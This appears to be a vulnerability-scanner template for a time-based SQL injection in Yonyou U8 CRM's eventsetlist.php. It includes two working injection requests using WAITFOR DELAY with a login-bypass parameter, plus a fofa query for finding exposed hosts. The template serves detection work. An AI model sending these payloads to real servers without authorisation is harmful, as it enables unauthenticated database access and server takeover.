http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
          Cookie: PHPSESSID=bgsesstimeout-;
        - |
          GET /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
          Cookie: PHPSESSID=bgsesstimeout-
id: yongyouU8-CRM-eventsetlist_php-sql-time
info:
    author: Superhero
    description: |-
        fofa: title="用友U8CRM"
        用友 U8 CRM客户关系管理系统 eventsetlist.php 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
    name: 用友U8 CRM eventsetlist.php SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/ZqqKsovbdnR_EpH9EO02_g
    severity: high
    tags:
        - 用友u8
        - 用友U8CRM
        - 用友U8
